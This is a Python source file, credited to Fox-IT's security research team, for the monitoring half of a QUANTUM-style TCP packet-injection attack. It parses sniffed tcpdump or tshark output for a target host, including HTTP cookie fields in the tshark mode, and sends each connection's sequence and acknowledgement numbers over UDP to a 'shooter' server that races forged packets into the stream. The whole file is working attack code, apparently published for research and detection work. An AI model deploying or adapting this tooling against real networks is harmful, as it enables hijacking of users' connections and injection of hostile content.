#!/usr/bin/env python
#
# file:     monitor.py
# author:   Fox-IT Security Research Team <srt@fox-it.com>
#
# monitor.py, used to leak TCP sequence + ack numbers to the shooter
#
# Example usage for tcpdump (shoot on SYN+ACK reply from server):
#  $ stdbuf --output=0 tcpdump -nn -i eth0 "host jsonip.com and tcp[tcpflags]=(tcp-syn|tcp-ack)" | python monitor.py -s 127.0.0.1
#
# Example usage for tshark (shoot on GET request from client):
#  $ stdbuf --output=0 tshark -ni eth0 -Tfields -e tcp.seq -e tcp.ack -e ip.src -e tcp.srcport -e ip.dst -e tcp.dstport -e tcp.analysis.bytes_in_flight -e http.host -e 'http.cookie' -o tcp.relative_sequence_numbers:0 -R http.request 'host jsonip.com and port 80' | python monitor.py -s 127.0.0.1 --tshark
#

# Python imports
import re
import sys
import struct
import socket
import argparse
import collections

# Shared data
QuantumTip = collections.namedtuple("QuantumTip", "src dst sport dport seq ack")
TIP_STRUCT = "IIHHII"
TIP_LEN = struct.calcsize(TIP_STRUCT)

# This regex may vary by tcpdump versions and/or operating systems
REGEX_SYNACK = re.compile("([\d\.]+)\.(\d+) > ([\d\.]+)\.(\d+): Flags.*seq (\d+), ack (\d+)")


def main():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("-s", "--shooter", default=None,
                        help="ip of the shooter server")
    parser.add_argument("-p", "--port", type=int, default=1111,
                        help="(udp) port of the shooter")
    parser.add_argument("-t", "--tshark", default=False,
                        action="store_true",
                        help="parse output of tshark (see examples)")

    args = parser.parse_args()
    if args.shooter is None:
        parser.print_help()
        return 1

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print 'Monitor ready to tip %s:%u' % (args.shooter, args.port)

    while True:
        line = sys.stdin.readline()
        print line.strip()
        if args.tshark:
            seq, ack, src, sport, dst, dport, size, host, cookie = line.split("\t")
            src, sport, dst, dport = dst, dport, src, sport
            seq, ack = ack, seq
            seq = int(seq) - 1
            ack = int(ack)
        else:
            src, sport, dst, dport, seq, ack = REGEX_SYNACK.search(line).groups()

        # print src, sport, dst, dport, seq, ack
        tip = QuantumTip(
            src=struct.unpack(">I", socket.inet_aton(src))[0],
            dst=struct.unpack(">I", socket.inet_aton(dst))[0],
            sport=int(sport),
            dport=int(dport),
            seq=int(seq),
            ack=int(ack),
        )
        data = struct.pack(TIP_STRUCT, *tip._asdict().values())
        sock.sendto(data, (args.shooter, args.port))
        print 'Sending', tip

if __name__ == '__main__':
    sys.exit(main())
